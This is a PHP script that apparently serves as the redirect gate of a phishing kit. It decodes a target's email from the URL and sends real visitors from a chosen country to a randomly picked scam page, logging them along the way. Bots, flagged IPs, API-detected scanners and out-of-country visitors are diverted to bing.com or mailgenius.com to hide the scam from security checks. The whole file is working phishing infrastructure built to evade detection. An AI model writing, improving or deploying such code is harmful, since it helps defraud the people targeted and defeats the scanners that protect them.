<?php

// Set headers to prevent caching
// header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// Include required files
require_once('../core/beon_core.php');
require_once('../core/short_core.php');

// Set error reporting based on the environment
if ($_ENV['ENVIRONMENT'] === 'development') {
    ini_set('display_errors', 1);
    ini_set("memory_limit", -1);
    error_reporting(1);
} else {
    ini_set('display_errors', 0);
    ini_set("memory_limit", -1);
    error_reporting(0);
}


// Initialize a variable to track whether insertVisitor has been called
static $insertVisitorCalled = false;

// Decode email from the query parameter
$email = base64_decode($_GET['key']);

// Get the origin (HTTP host)
$origin = $_SERVER['HTTP_HOST'];

// Check if email is flagged as a scam
$compare_scam = compare_scama();


if ($compare_scam === "YES") {
    // If it's a scam, redirect to the scam link
    $result_scama = result_scama();
    $visit_scama = $result_scama[0]['link_scama'];
    $visitorId = $result_scama[0]['id_visitor_scama'];

    // Check if insertVisitor has been called
    if (!$insertVisitorCalled) {
        insertVisitor($origin, $visit_scama, "NO", "udah ada");
        $insertVisitorCalled = true; // Set the variable to true
    }

    updateActivity($visitorId);
    header("Location: $visit_scama", TRUE, 301);
    exit();
}

// Get the country code of the visitor
$client_code = getCountry()['country_code'];

// Get a random scam link
$link = getScama();
$linkscama = $link[array_rand($link)]['link_sc'];

// Get the allowed country
$country_lock = getCountryLock()[0]['country'];

// Check if the visitor is not a bot
if (deviceBot() === 'NO') {

    // Check if the IP is not blocked by a bot
    $check_bot_ip = strtoupper(ipbot()['block']);

    if ($check_bot_ip === 'NO') {

        // Check if the neutrinoapi API is available
        $check_neutrinoapi_api = check_neutrinoapi_api();

        if ($check_neutrinoapi_api === 'YES') {
            // If neutrinoapi is available, redirect to Bing

            // Check if insertVisitor has been called
            if (!$insertVisitorCalled) {
                insertVisitor($origin, "https://bing.com/", 'YES', 'neutrinoapi');
                $insertVisitorCalled = true; // Set the variable to true
            }

            header("Location: https://bing.com/", TRUE, 301);
            exit();
        } else {
            // If country matches, insert scam link and redirect
            if ($country_lock === $client_code) {

                // Check if insertVisitor has been called
                if (!$insertVisitorCalled) {
                    insert_scama($linkscama, $email);
                    insertVisitor($origin, $linkscama, 'NO', 'NO');
                    $insertVisitorCalled = true; // Set the variable to true
                }

                header("Location: $linkscama", TRUE, 301);
                exit();
            } else {
                // If country doesn't match, redirect to mailgenius

                // Check if insertVisitor has been called
                if (!$insertVisitorCalled) {
                    insertVisitor($origin, "mailgenius", 'YES', 'Diff country');
                    $insertVisitorCalled = true; // Set the variable to true
                }

                header("Location: https://www.mailgenius.com/", TRUE, 301);
                exit();
            }
        }
    } else if ($check_bot_ip === 'YES') {
        // If the IP is blocked by a bot, redirect to Bing

        // Check if insertVisitor has been called
        if (!$insertVisitorCalled) {
            insertVisitor($origin, "https://bing.com/", 'YES', 'proxycheck');
            $insertVisitorCalled = true; // Set the variable to true
        }

        header("Location: https://bing.com/", TRUE, 301);
        exit();
    }
} else {
    // If the visitor is a bot, redirect to Bing

    // Check if insertVisitor has been called
    if (!$insertVisitorCalled) {
        insertVisitor($origin, "https://bing.com/", 'YES', 'Device bot');
        $insertVisitorCalled = true; // Set the variable to true
    }

    header("Location: https://bing.com/", TRUE, 301);
    exit();
}
?>
